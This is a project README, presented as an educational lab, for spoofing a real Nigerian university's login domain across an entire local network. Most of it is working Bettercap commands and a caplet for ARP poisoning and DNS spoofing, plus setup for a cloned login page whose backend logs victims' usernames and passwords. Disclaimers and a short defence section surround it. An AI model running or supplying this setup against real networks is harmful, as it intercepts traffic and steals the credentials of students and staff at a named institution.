# DNS Spoofing Lab Exercise - Credential Harvesting

## ⚠️ DISCLAIMER

**THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY**

This lab exercise is designed to teach cybersecurity concepts in a controlled environment. Unauthorized access to computer systems and networks is illegal. Only perform these exercises:
- In your own controlled lab environment
- On networks you own or have explicit permission to test
- As part of authorized educational activities

Misuse of these techniques may result in criminal prosecution.

---

## 📋 Overview

This lab demonstrates how attackers use DNS spoofing to redirect victims to fake login pages and harvest credentials. You'll learn:
- How DNS spoofing works
- How to use Bettercap for network attacks
- How credential harvesting operates
- How to defend against these attacks

**Target**: Spoof `ug.nsuk.edu.ng` across an entire network to redirect users to a fake login portal.

---

## 🛠️ Prerequisites

### Hardware Requirements
- Attacker machine (Linux recommended - Kali Linux, Ubuntu, etc.)
- At least 2 victim devices on the same network
- Router/Network access

### Software Requirements
- **Bettercap** (for DNS spoofing and ARP poisoning)
- **Python 3.8+** (for Flask backend)
- **Node.js 16+** and **Yarn** (for React frontend)
- **Git**

---

## 📦 Installation

### 1. Install Bettercap

**On Kali Linux / Debian / Ubuntu:**
```bash
sudo apt update
sudo apt install bettercap -y
```

**On other Linux distributions:**
```bash
# Install dependencies
sudo apt install libpcap-dev libnetfilter-queue-dev

# Download and install
wget https://github.com/bettercap/bettercap/releases/latest/download/bettercap_linux_amd64.zip
unzip bettercap_linux_amd64.zip
sudo mv bettercap /usr/local/bin/
sudo chmod +x /usr/local/bin/bettercap
```

**Verify installation:**
```bash
bettercap --version
```

### 2. Clone the Project

```bash
git clone <repository-url>
cd NSUK_CLONE
```

### 3. Setup Backend (Flask)

```bash
cd backend

# Create virtual environment
python3 -m venv .

# Activate virtual environment
source bin/activate  # On Linux/Mac
# OR
.\Scripts\activate  # On Windows

# Install dependencies
pip install -r requirements.txt

# Verify setup
python app.py
```

The backend should start on `http://0.0.0.0:5000`

### 4. Setup Frontend (React)

Open a new terminal:

```bash
cd frontend

# Install dependencies
yarn install

# Configure backend URL in .env file
# Edit frontend/.env and replace 'your_pc_ip' with your actual IP
# Example: VITE_API_URL=http://192.168.1.100:5000
```

**Find your IP address:**
```bash
ip addr show | grep inet  # Linux/Mac
# or
ipconfig  # Windows
```

Edit `frontend/.env`:
```bash
VITE_API_URL=http://192.168.1.100:5000  # Replace with your IP
```

**Build for production:**
```bash
yarn build
```

**Serve the built files:**
```bash
# Install a simple HTTP server
npm install -g serve

# Serve on port 80 (requires sudo)
sudo serve -s dist -l 80
```

Or use Python's built-in server:
```bash
cd dist
sudo python3 -m http.server 80
```

---

## 🎯 Lab Exercise Steps

### Step 1: Find Your Network Information

```bash
# Find your network interface
ip addr show
# or
ifconfig

# Note your interface name (e.g., eth0, wlan0)
# Note your IP address (e.g., 192.168.1.100)

# Find your gateway
ip route | grep default
# Note the gateway IP (e.g., 192.168.1.1)
```

### Step 2: Enable IP Forwarding

This allows your machine to forward packets between victims and the gateway:

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

### Step 3: Start Your Servers

**Terminal 1 - Flask Backend:**
```bash
cd backend
source bin/activate
python app.py
```

**Terminal 2 - React Frontend:**
```bash
cd frontend/dist
sudo python3 -m http.server 80
```

### Step 4: Configure Bettercap

Create a Bettercap caplet file for automation:

```bash
nano dns-spoof.cap
```

Add the following content:
```
# Set network interface (replace with your interface)
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
set arp.spoof.fullduplex true

# DNS spoofing configuration
set dns.spoof.domains ug.nsuk.edu.ng
set dns.spoof.address YOUR_MACHINE_IP

# Start modules
arp.spoof on
dns.spoof on
net.sniff on
```

**Replace:**
- `192.168.1.0/24` with your network range
- `YOUR_MACHINE_IP` with your attacker machine's IP (e.g., 192.168.1.100)

Save and exit (Ctrl+X, Y, Enter)

### Step 5: Launch the Attack

**Start Bettercap with the caplet:**
```bash
sudo bettercap -iface YOUR_INTERFACE -caplet dns-spoof.cap
```

Replace `YOUR_INTERFACE` with your network interface (e.g., eth0, wlan0)

**Alternative - Manual Commands:**
```bash
sudo bettercap -iface YOUR_INTERFACE

# Inside Bettercap console:
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
set arp.spoof.fullduplex true
set dns.spoof.domains ug.nsuk.edu.ng
set dns.spoof.address YOUR_MACHINE_IP

arp.spoof on
dns.spoof on
net.sniff on
```

### Step 6: Monitor Captured Credentials

**Watch the Flask console** for incoming login attempts.

**Or monitor the log file:**
```bash
# In a new terminal
cd backend
tail -f lab_capture.log
```

You'll see captured credentials in JSON format:
```json
{
  "timestamp": "2024-01-15T10:30:45.123456",
  "ip": "192.168.1.50",
  "user_agent": "Mozilla/5.0...",
  "credentials": {
    "userId": "captured_username",
    "password": "captured_password"
  }
}
```

### Step 7: Test the Attack

From a victim device on the same network:
1. Open a web browser
2. Navigate to `http://ug.nsuk.edu.ng`
3. You should see the fake login page
4. Enter test credentials
5. Check the attacker machine for captured data

### Step 8: Stop the Attack

In the Bettercap console:
```
arp.spoof off
dns.spoof off
net.sniff off
exit
```

Disable IP forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## 🔍 Understanding the Attack

### What Happens:

1. **ARP Spoofing**: Bettercap sends fake ARP responses to all devices on the network, making them think your machine is the gateway
2. **Traffic Interception**: All network traffic flows through your machine
3. **DNS Spoofing**: When victims request `ug.nsuk.edu.ng`, Bettercap responds with your machine's IP instead of the real server
4. **Credential Capture**: Victims see your fake login page and enter credentials
5. **Data Logging**: Flask backend logs all submitted credentials

### Network Flow:
```
Victim Device → (thinks it's talking to gateway) → Attacker Machine
                                                    ↓
                                            DNS Spoof + Fake Site
                                                    ↓
                                            Credentials Captured
                                                    ↓
                                            Real Gateway (traffic forwarded)
```

---

## 🛡️ Defense Mechanisms

### How to Protect Against This Attack:

1. **HTTPS/SSL**: Always use HTTPS. Browsers will show warnings for invalid certificates
2. **HSTS**: HTTP Strict Transport Security forces HTTPS connections
3. **Certificate Pinning**: Apps can validate specific certificates
4. **ARP Spoofing Detection**: Tools like ARPwatch can detect ARP poisoning
5. **Network Segmentation**: Isolate critical systems
6. **Static ARP Entries**: Manually configure ARP tables (not scalable)
7. **DNSSEC**: Cryptographically signed DNS responses
8. **VPN**: Encrypted tunnels prevent local network attacks

### Red Flags for Users:
- Browser security warnings
- HTTP instead of HTTPS
- Certificate errors
- Unusual login page appearance
- Slow network performance during attack

---

## 📊 Lab Report Template

Document your findings:

### 1. Network Information
- Network range: _______________
- Gateway IP: _______________
- Attacker IP: _______________
- Number of devices affected: _______________

### 2. Attack Success Rate
- Total devices on network: _______________
- Devices that accessed fake site: _______________
- Credentials captured: _______________

### 3. Observations
- Time to compromise network: _______________
- Did victims notice anything suspicious? _______________
- What defense mechanisms were present? _______________

### 4. Mitigation Recommendations
- List 3-5 specific defenses for this network

---

## 🐛 Troubleshooting

### Bettercap won't start
```bash
# Check if running as root
sudo bettercap --version

# Check interface name
ip link show
```

### DNS spoofing not working
```bash
# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward

# Check if ports are available
sudo netstat -tulpn | grep :53
```

### Frontend can't connect to backend
- Verify Flask is running on `0.0.0.0:5000`
- Check firewall rules: `sudo ufw allow 5000`
- Update `VITE_API_URL` in `frontend/.env` with correct IP (replace `your_pc_ip`)

### Victims still see real site
- Clear DNS cache on victim device
- Verify Bettercap shows DNS spoofing is active
- Check that your IP is correct in Bettercap config

---

## 📚 Additional Resources

- [Bettercap Documentation](https://www.bettercap.org/usage/)
- [ARP Spoofing Explained](https://en.wikipedia.org/wiki/ARP_spoofing)
- [DNS Spoofing Overview](https://en.wikipedia.org/wiki/DNS_spoofing)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## ⚖️ Legal Notice

Performing these attacks without authorization is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws in other jurisdictions

**Always obtain written permission before testing security on any network you don't own.**

---

## 📝 License

This project is for educational purposes only. Use responsibly and ethically.
